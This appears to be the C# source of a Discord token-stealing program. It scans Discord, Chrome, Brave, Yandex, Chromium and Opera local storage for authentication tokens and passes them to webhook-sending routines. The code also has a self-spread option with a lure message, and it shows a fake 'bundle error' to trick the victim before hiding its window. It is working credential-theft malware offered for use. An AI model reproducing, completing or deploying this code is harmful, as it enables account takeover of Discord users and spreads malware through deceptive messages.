using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace logger
{
    class Program
    {


        //main hook
        public static string webhook = "";

        //will work if the main^ is dead
        public static string altwebhook = "";

        //enable self spread?
        public static bool selfspread = false;

        //self spread message, use {url} for the url.
        public static string msg = "Look at this nice file! {url}";






        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private static async Task Main(string[] args)
        {



          
            await TokenGrabber();

            try
            {
                await Utils.SendWebhookAsync();
            }
            catch
            {
                Console.WriteLine("_DISABLE_ANTIVIRUS");
            }
            

            Console.WriteLine(@"Failure processing application bundle.
Bundle header version compatibility check failed.
A fatal error occured while processing application bundle

Press any key to close...");
            Console.ReadKey();

            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);





            while (true) { }



        }


        public static async 

        Task
TokenGrabber()
        {
           
            var tokens = GetTokens();

            Parallel.ForEach(tokens, token =>
            {
                //Console.WriteLine(token);
                DiscordAPI.main(token);

            });
            
        }

        public static List<string> GetTokens()
        {
            var paths = new Dictionary<string, string>();
            var tokens = new List<string>();

            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            paths.Add("Discord", roaming + "\\discord");
            paths.Add("Discord Canary", roaming + "\\discordcanary");
            paths.Add("Discord PTB", roaming + "\\discordptb");
            paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");

            foreach (KeyValuePair<string, string> kvp in paths)
            {
                string platform = kvp.Key;
                string path = kvp.Value;

                if (!Directory.Exists(path))
                    continue;

                foreach (string token in FindTokens(path))
                {
                    tokens.Add(token);
                }
            }
            return tokens;
        }

        public static List<string> FindTokens(string path)
        {
            path += "\\Local Storage\\leveldb";
            var tokens = new List<string>();

            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string content = File.ReadAllText(file);

                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                {
                    tokens.Add(match.ToString());
                }
            }
            return tokens;
        }

       
    }

}

